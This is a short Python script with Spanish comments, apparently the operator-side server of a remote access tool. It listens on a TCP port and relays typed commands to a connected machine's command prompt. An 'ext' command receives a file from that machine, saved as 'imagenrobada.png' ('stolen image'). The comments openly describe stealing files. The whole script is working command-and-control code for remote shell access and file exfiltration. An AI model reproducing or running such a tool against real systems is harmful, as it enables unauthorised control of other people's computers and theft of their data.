import socket
import os

#Parte del codigo dedicado a crear el archivo donde se sustituiran los bits, aqui mismo por medio del while recibira cada bit del archivo,
#avisara si no se encuentra el archivo al cual robar, tambien por medio del LISTO se guardaran todos los bits dentro del archivo
def trans(conn, command):
    conn.send(command.encode())
    f = open("C:\\scripts\\imagenrobada.png",'wb')
    while True: 
        bits = conn.recv(1024)
        print('recibiendo...')
        if ('Unable to find out the file').encode() in bits:
            print ('[-] No se encontro el archivo')
            break
        if bits.endswith(('|LISTO|').encode()):
            print ('[+] Transferencia completa ')
            f.close()
            break
        f.write(bits)

#Aqui se establece la conexion TCP, y acepta los comandos "Bye", "ext" y cualquier otra entrada para desplegar infromacion del CMD.
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv_addr = ('localhost', 2121)
    s.bind(serv_addr)
    s.listen(1)
    conn, addr = s.accept()
    print ('starting up on {} port {}'.format(*serv_addr))


    while True:
        command = input(':>> ')
        if 'bye' in command:
            conn.send(command.encode())
            conn.close()
            break
        
        elif 'ext' in command:
            trans(conn, command)
        else:
            conn.send(command.encode()) 
            print (conn.recv(1024)) 

def main ():
    connect()
main()
